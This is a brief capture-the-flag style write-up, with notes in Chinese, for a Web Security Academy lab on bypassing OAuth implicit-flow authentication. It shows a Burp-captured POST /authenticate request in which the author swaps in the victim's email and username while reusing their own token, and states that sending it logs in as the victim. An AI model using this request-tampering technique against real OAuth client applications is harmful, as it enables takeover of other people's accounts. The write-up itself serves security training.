# Lab: Authentication bypass via OAuth implicit flow

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net.

You can log in with your own social media account using the following credentials: wiener:peter.

## OAuth Authentication
* 題目說有驗證，用 burp 抓一下可以看到其中一個封包
```
POST /authenticate HTTP/1.1
Host: ac351f461f9fab1cc115b73400c70071.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: application/json
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://ac351f461f9fab1cc115b73400c70071.web-security-academy.net/oauth-callback
Content-Type: application/json
Origin: https://ac351f461f9fab1cc115b73400c70071.web-security-academy.net
Content-Length: 111
Connection: close
Cookie: session=bmd6wJDm5vlF8oak7nIWqer7hMxZwHyK
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 127.0.0.1

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"gQ-Dhz7q6mlx4xIge8oYskseegX8Fdy2_Nt7qy2babZ"}
```
* 改成這樣送出就可以了